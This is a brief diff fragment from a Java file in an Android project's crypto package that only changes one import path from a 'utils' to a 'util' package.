@@ -10,7 +10,7 @@ package com.ht.RCSAndroidGUI.crypto;
 import android.provider.Settings.Secure;
 
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
 // This class should only be read by Device
